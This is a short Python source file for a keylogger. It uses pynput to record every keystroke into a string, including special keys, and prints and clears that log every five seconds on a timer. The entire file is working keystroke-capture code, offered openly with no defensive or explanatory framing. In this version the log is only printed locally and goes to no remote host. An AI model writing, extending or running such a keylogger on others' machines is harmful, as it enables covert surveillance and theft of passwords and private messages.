import pynput.keyboard
import threading


class Keylogger:
    def __init__(self):
        self.log = ""
        print('[+] Starting keylogger')

    def onPress(self, key):
        try:
            self.log = self.log + str(key.char)
        except AttributeError:
            if key == key.space:
                self.log = self.log + " "
            else:
                self.log = self.log + " " + str(key) + " "

    def report(self):
        print(self.log)
        self.log = ""
        timer = threading.Timer(5, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.onPress)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

def __main__():
    keylog = Keylogger()
    keylog.start()

__main__()